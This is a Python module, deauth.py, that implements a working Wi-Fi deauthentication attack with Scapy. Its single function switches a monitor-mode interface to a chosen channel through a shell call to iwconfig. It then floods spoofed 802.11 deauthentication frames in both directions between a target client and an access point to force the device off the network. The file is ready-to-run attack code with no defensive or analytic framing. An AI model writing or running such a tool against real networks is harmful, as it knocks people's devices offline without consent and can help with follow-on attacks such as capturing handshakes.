"""
deauth.py

This module provides functionality to perform deauthentication attacks
against Wi-Fi clients using Scapy. It sends spoofed deauthentication
frames to disconnect a target device from a specified access point (AP).
"""

from scapy.all import *
import os
import time

def send_deauth(target_mac, ap_mac, iface, channel, count=50):
    """
    Sends deauthentication packets to a specific target on a given Wi-Fi channel.

    Parameters:
    - target_mac (str): MAC address of the target client to disconnect.
    - ap_mac (str): MAC address of the access point (AP) being spoofed.
    - iface (str): Wireless interface in monitor mode used to send packets.
    - channel (int): Wi-Fi channel on which the AP operates.
    - count (int): Number of deauth packets to send (default: 50).
    """
    print(f"[!] Deauthing {target_mac} on channel {channel}...")

    def _set_channel(ch):
        """
        Helper function to set the wireless interface to a specific channel.
        """
        # Use iwconfig to set the wireless interface to the desired channel
        os.system(f"iwconfig {iface} channel {ch}")
        time.sleep(0.5)  # Wait briefly to ensure channel switch is applied

    # Construct deauth packet from AP to client
    # addr1: destination (target client), addr2: source (AP), addr3: BSSID (AP)
    pkt1 = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)

    # Construct deauth packet from client to AP (simulate bidirectional termination)
    # addr1: destination (AP), addr2: source (client), addr3: BSSID (AP)
    pkt2 = RadioTap() / Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac) / Dot11Deauth(reason=7)

    try:
        # Set the interface to the correct channel before sending packets
        _set_channel(channel)

        # Transmit the spoofed deauth packets to both directions
        sendp([pkt1, pkt2], iface=iface, count=count, inter=0.05, verbose=0)
    except KeyboardInterrupt:
        print("[!] Stopped by user.")
    
    print(f"[+] Deauth sent to {target_mac}")